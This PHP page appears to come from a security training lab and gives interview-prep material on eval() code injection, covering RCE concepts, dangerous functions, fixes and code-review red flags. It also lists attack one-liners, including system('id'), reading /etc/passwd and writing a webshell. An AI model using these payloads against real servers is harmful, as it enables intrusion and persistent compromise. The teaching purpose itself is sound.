<?php
require_once __DIR__ . '/includes/helpers.php';
$page_title = 'Interview Prep — eval() Code Injection (R1)';
include __DIR__ . '/includes/header.php';
?>

<div class="page">
  <div class="interview-page">

    <div class="interview-hero">
      <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:8px;">
        <span class="badge badge-beginner">Beginner</span>
        <span style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)">LAB R1 · INTERVIEW PREP</span>
      </div>
      <h1 style="margin:0 0 6px;">eval() Code Injection</h1>
      <p style="color:var(--text-muted);font-size:0.9rem;margin:0;">Remote Code Execution through PHP's <code>eval()</code> on unsanitized user input. High-frequency topic in AppSec interviews and OWASP A03.</p>
      <div style="margin-top:12px;">
        <a href="/rce_r1.php" class="btn btn-primary btn-sm">Back to Lab</a>
      </div>
    </div>

    <!-- 30-Second Answer -->
    <div class="interview-section">
      <h2>30-Second Answer</h2>
      <div class="thirty-sec">
        RCE is when an attacker executes arbitrary code in the application's own runtime — the same process, the same privilege level. <code>eval()</code> on user input is the textbook case: the input <em>becomes</em> PHP code, not just data. No subprocess, no OS boundary — the attacker is inside the interpreter.
      </div>
    </div>

    <!-- Common Qs -->
    <div class="interview-section">
      <h2>Common Interview Questions</h2>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="q1">
        <label class="qa-question" for="q1">What is the difference between RCE and command injection?</label>
        <div class="qa-answer">
          <strong>RCE</strong> executes code in the application's own runtime (PHP interpreter, Python VM, JVM). <strong>Command injection</strong> spawns a new OS shell subprocess — the application passes user input to <code>shell_exec()</code>, <code>system()</code>, etc. RCE is broader: it gives the attacker access to all in-process resources (memory, loaded credentials, database connections) without crossing a process boundary. Command injection always involves a subprocess and depends on the OS shell parsing.
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="q2">
        <label class="qa-question" for="q2">Name dangerous PHP functions beyond system() and exec().</label>
        <div class="qa-answer">
          <ul style="margin:0;padding-left:1.2em;">
            <li><code>eval()</code> — executes a string as PHP code directly</li>
            <li><code>assert()</code> — in older PHP, evaluates a string as PHP code</li>
            <li><code>create_function()</code> — compiles a string into a callable (deprecated PHP 7.2, removed 8.0)</li>
            <li><code>preg_replace('/e', ...)</code> — the <code>/e</code> modifier evaluated replacement as PHP (removed PHP 7.0)</li>
            <li><code>call_user_func()</code> / <code>call_user_func_array()</code> — calls arbitrary callables, dangerous if the callable name is user-controlled</li>
            <li><code>include</code> / <code>require</code> — remote file inclusion if path is user-controlled and <code>allow_url_include</code> is on</li>
          </ul>
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="q3">
        <label class="qa-question" for="q3">How does eval() code injection lead to full server compromise?</label>
        <div class="qa-answer">
          Once inside <code>eval()</code>, the attacker can: (1) read arbitrary files via <code>file_get_contents()</code> — config files, <code>.env</code>, database credentials; (2) write files via <code>file_put_contents()</code> — plant a persistent webshell; (3) spawn OS commands via <code>system()</code> or <code>shell_exec()</code> — pivot to the OS, enumerate the network, install tools; (4) read environment variables and PHP configuration (<code>phpinfo()</code>); (5) access any in-process object — open database handles, session data, internal API keys.
        </div>
      </div>

      <div class="qa-item">
        <input type="checkbox" class="answer-toggle" id="q4">
        <label class="qa-question" for="q4">Can you safely use eval() for a math evaluator?</label>
        <div class="qa-answer">
          No — not by sanitizing. Whitelisting only digits, operators, and parentheses with a regex is brittle and has been bypassed repeatedly. The only safe approach for math evaluation is a purpose-built expression parser that never touches the PHP interpreter. Libraries like <strong>mossadal/math-parser</strong> or <strong>symfony/expression-language</strong> parse a restricted grammar. If you need to evaluate expressions from users, treat <code>eval()</code> as categorically off-limits.
        </div>
      </div>
    </div>

    <!-- Dev Fix -->
    <div class="interview-section">
      <h2>Developer Fix</h2>
      <div style="display:flex;flex-direction:column;gap:10px;font-size:0.875rem;color:var(--text-muted);">
        <div><strong style="color:var(--text);">Never eval() user input.</strong> There is no safe way to sanitize input before passing it to <code>eval()</code>.</div>
        <div><strong style="color:var(--text);">Use a safe expression parser</strong> for math (e.g., allow only <code>[0-9+\-*/().\s]</code> through a whitelist regex, then use a proper AST parser — never <code>eval()</code>).</div>
        <div><strong style="color:var(--text);">Disable dangerous functions</strong> in <code>php.ini</code>: <code>disable_functions = exec,system,shell_exec,passthru,popen,proc_open,eval</code> — note that <code>eval()</code> is a language construct and cannot be disabled via <code>disable_functions</code>; use a WAF or Suhosin patch for that.</div>
        <div><strong style="color:var(--text);">Run PHP under a restricted user</strong> with minimal filesystem permissions. Even if RCE is achieved, limit the blast radius.</div>
      </div>
    </div>

    <!-- One-liners -->
    <div class="interview-section">
      <h2>Attack One-Liners</h2>
      <p style="font-size:0.82rem;color:var(--text-muted);margin-bottom:10px;">Paste these into the <code>expr</code> parameter of a vulnerable eval calculator:</p>
      <div class="oneliner">1; system('id')</div>
      <div class="oneliner">1; echo file_get_contents('/etc/passwd')</div>
      <div class="oneliner">phpinfo()</div>
      <div class="oneliner">1; $result = file_get_contents('/flags/lab_r1.txt')</div>
      <div class="oneliner">1; file_put_contents('/var/www/html/uploads/r1shell.php', '&lt;?php system($_GET["c"]); ?&gt;')</div>
    </div>

    <!-- Red Flags -->
    <div class="interview-section">
      <h2>Red Flags in Code Review</h2>
      <div class="red-flag-item">&#9888; Using <code>eval()</code> at all — treat every occurrence as a finding requiring justification</div>
      <div class="red-flag-item">&#9888; "We only allow math characters" — regex whitelists on eval input are not safe</div>
      <div class="red-flag-item">&#9888; <code>assert($userInput)</code> — in PHP &lt;8, assert evaluates string arguments as code</div>
      <div class="red-flag-item">&#9888; <code>preg_replace("/{$userPattern}/e", ...)</code> — the <code>/e</code> modifier was eval in disguise</div>
      <div class="red-flag-item">&#9888; Dynamic includes: <code>include $_GET['page'] . '.php'</code> — a different path to code execution</div>
    </div>

  </div>
</div>

<?php include __DIR__ . '/includes/footer.php'; ?>
